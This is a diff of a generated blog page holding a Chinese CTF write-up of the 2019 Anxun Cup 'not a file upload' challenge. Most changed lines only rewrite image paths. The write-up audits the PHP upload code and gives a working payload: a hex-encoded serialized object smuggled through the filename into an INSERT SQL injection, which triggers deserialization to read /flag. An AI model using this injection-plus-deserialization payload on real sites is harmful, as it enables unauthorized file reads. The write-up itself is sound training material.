@@ -17,7 +17,7 @@ github找到项目并下载下来
     {
         $fileinfo = $th,"> 
     <meta name="author" content="H3ng"> 
-    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
     
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
@@ -59,9 +59,9 @@ github找到项目并下载下来
 
         </div>
         <div class="content markdown">
-            <p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF%EF%BC%9A2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20210920191233325.png" alt="image-20210920191233325"></p>
+            <p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920191233325.png" alt="image-20210920191233325"></p>
 <p>github找到项目并下载下来</p>
-<p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF%EF%BC%9A2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20210920191305777.png" alt="image-20210920191305777"></p>
+<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920191305777.png" alt="image-20210920191305777"></p>
 <h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h5 id="helper-php"><a href="#helper-php" class="headerlink" title="helper.php"></a>helper.php</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string">"file"</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -125,7 +125,7 @@ github找到项目并下载下来
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span></code></pre>
 <p>__destruct魔术方法</p>
-<h5 id="show-php"><a href="#show-php" class="headerlink" title="show.php"></a>show.php</h5><p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF%EF%BC%9A2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20210920192444172.png" alt="image-20210920192444172"></p>
+<h5 id="show-php"><a href="#show-php" class="headerlink" title="show.php"></a>show.php</h5><p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920192444172.png" alt="image-20210920192444172"></p>
 <p>反序列化</p>
 <h5 id="总的来说就是"><a href="#总的来说就是" class="headerlink" title="总的来说就是"></a>总的来说就是</h5><p>1.图片传上之后，check函数并未对文件名(title)进行检测, 直接传递到最后的SQL语句当中。导致<br>了SQL注入，并且属于Insert注入。<br>2.图片数据在保存的时候，会将图片的高度和宽度进行序列化然后保存。<br>3.在查看图片信息的页面(show.php)会对其进行反序列化。</p>
 <h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -140,12 +140,12 @@ github找到项目并下载下来
 <pre><code>O:6:"helper":2:{s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";}</code></pre>
 <p>改为</p>
 <pre><code>O:6:"helper":2:{s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";}</code></pre>
-<p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF%EF%BC%9A2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20210920194842880.png" alt="image-20210920194842880"></p>
+<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194842880.png" alt="image-20210920194842880"></p>
 <pre><code>1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg</code></pre>
 <p>上传的时候更改文件名</p>
-<p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF%EF%BC%9A2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20210920194226160.png" alt="image-20210920194226160"></p>
+<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194226160.png" alt="image-20210920194226160"></p>
 <p>然后访问show.php</p>
-<p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF%EF%BC%9A2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20210920194251078.png" alt="image-20210920194251078"></p>
+<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194251078.png" alt="image-20210920194251078"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
